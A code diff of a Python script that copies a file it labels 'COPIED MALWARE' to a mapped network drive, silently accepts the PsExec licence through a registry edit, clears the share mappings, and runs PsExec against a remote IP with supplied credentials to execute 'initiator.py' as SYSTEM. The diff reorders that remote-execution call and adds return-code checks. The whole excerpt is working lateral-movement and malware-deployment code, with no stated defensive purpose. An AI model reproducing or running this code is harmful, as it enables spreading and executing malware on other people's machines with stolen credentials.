@@ -10,11 +10,14 @@ def main(user, password, ip):
     print(str(os.popen(r'copy "..\FileTransfer.py" "h:\"  /Y').read()))
     print("COPIED MALWARE")
     print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
-    print(str(os.popen(
-        r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -i -s python "c:\initiator.py"').read()))
-    print('DONE')
     os.popen('Net use * /delete /Y').read()
-    print('DONE')
+    x = os.popen(r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -i 2 -s python "c:\initiator.py"')
+    print(str(x.read()))
+    x = x.close()
+    if (x == None or x == 0):
+        return True
+    else:
+        return str(x)
 
 
 if __name__ == '__main__':
